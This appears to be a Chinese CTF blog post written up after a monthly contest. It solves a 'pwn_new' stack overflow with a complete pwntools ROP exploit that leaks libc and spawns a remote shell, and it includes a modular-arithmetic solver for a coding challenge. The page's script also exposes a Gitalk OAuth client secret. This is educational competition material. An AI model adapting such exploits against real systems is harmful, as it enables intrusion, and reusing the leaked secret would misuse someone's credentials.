@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang=zh-CN>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="Purse the balance of everything.">
+  <meta name="keywords" content="CTF, Blog">
+  
+    <link rel="icon" href>
+  
+    
+  <title>月赛乙队题目记录-2019-02-24 | Mads Blog</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/css/my.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/gitalk.css">
+  <script src="/lib/gitalk.min.js"></script>
+  <link href="https://cdn.bootcss.com/font-awesome/5.7.0/css/all.css" rel="stylesheet">
+
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <i class="fas fa-cat" style="margin-right: 10px"></i>
+      <span>Mads Blog</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content aath-body">
+          <h1>月赛乙队题目记录-2019-02-24</h1>
+          
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019年02月25日</time>
+            
+            
+              | 
+                  <i class="fa fa-tags" aria-hidden="true"></i>
+                
+               
+  <a href="/tags/#CTF" class='tag'>CTF</a>
+
+  <a href="/tags/#PWN" class='tag'>PWN</a>
+
+  <a href="/tags/#月赛" class='tag'>月赛</a>
+
+
+            
+            | <i class="fas fa-edit" aria-hidden="true"></i> <time>2019年03月18日</time>
+          </div>
+          
+          <p>初来乍到, 第一个星期就加了一个打CTF的学长, 把我拉到了队伍里面. 紧接着第一个周末刚好就赶上一月一次的月赛. 由于太菜, 打的是乙队比赛. 平时谈笑风生的队友们, 一到比赛都发现好强啊, 直接把题目就AK了(惊了). 由于当时报的是pwn方向, 一天除了看了道不简单的签到题(coding)外, 就在看pwn了. 也算运气好吧, 有个大佬早就本地getshell然而给的libc不对, 远程出了问题他就不打了, 被我搞了一下午然后抢了先机hhh. (emm, 好像是第二次在比赛中做出pwn题, 感觉还行.</p>
+<h1 id="pwn-new"><a href="#pwn-new" class="headerlink" title="pwn_new"></a>pwn_new</h1><p>nc 124.16.75.161 40005</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p><a href="https://youtu.be/vHvbqZZ6e5k" target="_blank" rel="noopener">视频讲解</a></p>
+<p>题目只给了binary, 下载下来checksec一下,</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>发现只开了NX, 乙队的题还是来的比较直接的. 跑了一下, 有三个功能, </p>
+<blockquote>
+<p>Please input your choice:<br>1: Edit Your User<br>2: Show Your Info<br>3: Exit<br>1<br>Please input your name:<br>mads<br>Please input your description:<br>script kid<br>Please input your choice:<br>1: Edit Your User<br>2: Show Your Info<br>3: Exit<br>2<br>User name: mads<br>Description: script kid<br>Please input your choice:<br>1: Edit Your User<br>2: Show Your Info<br>3: Exit<br>3</p>
+</blockquote>
+<p>功能挺简单的, 拖进IDA反编译得到源码, <code>main</code>函数就是基本的逻辑分支, 没找到什么漏洞. 在<code>read_input</code>函数发现了问题</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">read_input</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-71h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x65</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) != <span class="number">0</span> &amp;&amp; buf != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">    s[v2] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncpy</span>(a1, s, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是一个用于读取我们输入的名字与描述的函数, 先用一个s数组临时存入我们的输入, 然后再利用<code>strncpy</code>函数拷贝到<code>bss</code>段. 但是由于读入的时候终止判断的条件并不是字符个数, 而是换行符, 这就导致s数组下标的越界写. 这里由于是一个字符一个字符的读, 所以应该是只能越界读写s上下255偏移(一个字节)的地址, 但是足够可以在栈上进行ROP了. 具体思路如下</p>
+<ol>
+<li><p>因为是64位程序, 传参是通过寄存器来, 所以先用<code>ROPGadget</code>工具搜索一个<code>pop edi;ret;</code>的<code>gadget</code>来后续传参. 然后通过构造栈上ROP将一个libc函数的GOT地址传给<code>printf</code>函数, leak出一个libc函数地址. 这里我选的是<code>read</code>函数, 然后在ROP链的末尾跳转到<code>main</code>函数(跳到<code>read_input</code>函数出现了问题, 猜测是栈布局有问题).</p>
+</li>
+<li><p>得到一个libc函数后, 计算出libc基地址以及<code>system</code>函数与<code>binsh</code>字符串的地址. 然后进行第二次ROP直接跳到<code>system(&#39;/bin/sh&#39;)</code>拿到shell</p>
+</li>
+</ol>
+<p>EXP如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./main'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'124.16.75.161'</span>,<span class="number">40005</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = <span class="number">0x4006f4</span></span><br><span class="line">pop_edi = <span class="number">0x400833</span></span><br><span class="line">pop_rsi_pop_r15 = <span class="number">0x400831</span></span><br><span class="line">read_input = <span class="number">0x400607</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, """b *0x400694\ncontinue""")</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">'A'</span>*<span class="number">108</span> + chr(<span class="number">120</span>) + p64(pop_edi) + p64(elf.got[<span class="string">'read'</span>]) + p64(printf_addr) + p64(<span class="number">0xdeadbeaf</span>) + p64(main_addr)</span><br><span class="line">edit(name)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line"></span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + next(libc.search(<span class="string">"/bin/sh\x00"</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc: '</span> + hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system: '</span> + hex(system)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'binsh: '</span> + hex(binsh)</span><br><span class="line"></span><br><span class="line">name2 = <span class="string">'A'</span>*<span class="number">108</span> + chr(<span class="number">120</span>) + p64(pop_edi) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">edit(name2)</span><br><span class="line"><span class="comment">#gdb.attach(p, """b *0x400694\ncontinue""")</span></span><br><span class="line">p.sendline(name2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="coding"><a href="#coding" class="headerlink" title="coding"></a>coding</h1><p>nc 124.16.75.161 40006</p>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>是一道解带模方程组的题, 看起来很简单, 然后怎么搞都做不出来嘤嘤嘤. (好像要用到数论的知识) 贴个队友答案, 有时间研究一下. </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2 -i</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">Local = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> Local:</span><br><span class="line">	host = <span class="string">'124.16.75.161'</span></span><br><span class="line">	port = <span class="number">40006</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">import</span> sys</span><br><span class="line">	default_host = <span class="string">'124.16.75.161'</span></span><br><span class="line">	host = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> default_host</span><br><span class="line">	port = <span class="number">40006</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uv</span><span class="params">(m,n)</span>:</span></span><br><span class="line">    </span><br><span class="line">	s = m % n</span><br><span class="line">	t = m // n</span><br><span class="line">	<span class="keyword">if</span> (n%s == <span class="number">0</span>):</span><br><span class="line">    	u = <span class="number">1</span></span><br><span class="line">    	v = -t</span><br><span class="line">    	<span class="comment">#print(u,v)</span></span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">    	x,y = uv(n,s)</span><br><span class="line">    	u = y</span><br><span class="line">    	v = x-y*t</span><br><span class="line">    	<span class="comment">#print(u,v)</span></span><br><span class="line">	<span class="keyword">return</span> u,v</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> a%b == <span class="number">0</span>:</span><br><span class="line">    	<span class="keyword">return</span> b</span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">    	<span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">	u,_=uv(a,b)</span><br><span class="line">	<span class="keyword">return</span> c/gcd(a,b)*u</span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvline()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">	s = r.recvuntil(<span class="string">'x='</span>)</span><br><span class="line">	s = s.split(<span class="string">','</span>)[<span class="number">0</span>].split(<span class="string">'*'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">	v1 = s.split(<span class="string">')'</span>)[<span class="number">0</span>]</span><br><span class="line">	l = s.split(<span class="string">'%'</span>)[<span class="number">1</span>]</span><br><span class="line">	v2 = l.split(<span class="string">'='</span>)[<span class="number">0</span>]</span><br><span class="line">	v3 = l.split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">print</span> v1</span><br><span class="line">	<span class="keyword">print</span> v2</span><br><span class="line">	<span class="keyword">print</span> v3</span><br><span class="line">	res = solve(int(v1), int(v2), int(v3))</span><br><span class="line">	r.sendline(str(res))</span><br><span class="line">pl = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">r.send(pl)</span><br><span class="line">raw_input(<span class="string">'continue -&gt;'</span>)</span><br><span class="line">pl = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>对了, 又有大佬在github发现了原题. </p>
+<p><a href="https://github.com/ThinerDAS/what-is-ctf/tree/master/nc-game2" target="_blank" rel="noopener">https://github.com/ThinerDAS/what-is-ctf/tree/master/nc-game2</a></p>
+
+          
+<div class="post-copyright">
+<p><span>本文标题：</span>月赛乙队题目记录-2019-02-24</p>
+<p><span>文章作者：</span>Mads</p>
+<p><span>发布时间：</span>2019/02/25 12:00:00</p>
+<p><span>更新时间：</span>2019/03/18 11:56:53</p>
+<p><span>原始链接：</span><a style="color: #bababa" href=" + data.permalink + ">http://lxzmads.github.io/2019/02/25/月赛乙队题目记录-2019-02-24/</a></p>
+<p><span>许可协议：</span><i class="fab fa-creative-commons"></i><a rel="license" style="color: #bababa" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a><span class="warn">转载请保留原文链接及作者</span></p>
+</div>
+ 
+        </section>
+    </article>
+    
+    <div class="comment">
+        <div id="gitalk-container"></div>
+    </div>
+    
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn-new"><span class="toc-number">1.</span> <span class="toc-text">pwn_new</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding"><span class="toc-number">2.</span> <span class="toc-text">coding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution-1"><span class="toc-number">2.1.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<script type="text/javascript">
+const gitalk = new Gitalk({
+  clientID: "6ae565c159db15a6167c",
+  clientSecret: '6b81331560c108209346bc4807a5126da190e14c',
+  repo: 'blogcomments',
+  owner: 'lxzmads',
+  admin: ['lxzmads'],
+  id: decodeURI(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath-魔改版 by Mads</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/lib/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
